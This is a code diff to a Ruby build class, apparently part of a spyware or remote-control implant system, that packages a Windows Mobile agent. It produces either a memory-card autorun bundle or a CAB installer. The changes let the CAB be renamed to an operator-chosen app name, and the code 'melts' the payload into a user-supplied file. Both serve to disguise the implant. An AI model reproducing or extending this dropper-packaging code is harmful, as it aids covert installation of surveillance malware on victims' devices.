@@ -46,6 +46,8 @@ class BuildWinMo < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    @appname = params['appname'] || 'install'
+
     # use the user-provided file to melt with,
     # but the actual melt will be performed later in the pack method
     if params['input']
@@ -72,7 +74,7 @@ class BuildWinMo < Build
     trace :debug, "Build: pack: #{params}"
 
     case params['type']
-      when 'card'
+      when 'local'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
           z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
           z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
@@ -80,7 +82,8 @@ class BuildWinMo < Build
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
 
-      when 'cab'
+      when 'remote'
+        #TODO: move this in the melt phase
         File.rename(path('firststage'), path('autorun.exe'))
         File.rename(path('ouput'), path('autorun.zoo'))
 
@@ -96,8 +99,10 @@ class BuildWinMo < Build
 
         File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
 
+        FileUtils.mv path('rcs.cab'), path(@appname + '.cab')
+
         # this is the only file we need to output after this point
-        @outputs = ['rcs.cab']
+        @outputs = [@appname + '.cab']
     end
 
   end
